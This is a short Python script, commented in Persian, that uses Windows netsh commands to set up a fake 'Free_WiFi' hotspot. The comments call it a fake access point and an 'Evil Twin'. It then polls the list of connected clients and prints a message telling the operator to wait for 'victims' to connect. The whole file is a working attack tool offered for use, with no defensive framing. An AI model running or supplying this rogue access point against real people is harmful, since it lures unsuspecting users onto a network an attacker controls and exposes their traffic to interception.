import subprocess
import time

# تنظیمات AP جعلی
ssid = "Free_WiFi"  # اسم جعلی شبکه
password = "12345678"  # رمز عبور

# ایجاد Hosted Network
print("[*] ایجاد AP جعلی...")
subprocess.run(f'netsh wlan set hostednetwork mode=allow ssid={ssid} key={password}', shell=True)

# شروع شبکه
print("[*] راه‌اندازی شبکه...")
subprocess.run('netsh wlan start hostednetwork', shell=True)

print(f"[+] Evil Twin فعال شد با SSID: {ssid} و پسورد: {password}")
print("[+] منتظر اتصال قربانی‌ها بمانید...")

try:
    while True:
        time.sleep(10)
        # نمایش کاربران متصل
        result = subprocess.check_output('netsh wlan show hostednetwork', shell=True)
        print(result.decode())
except KeyboardInterrupt:
    print("\n[*] توقف شبکه جعلی...")
    subprocess.run('netsh wlan stop hostednetwork', shell=True)
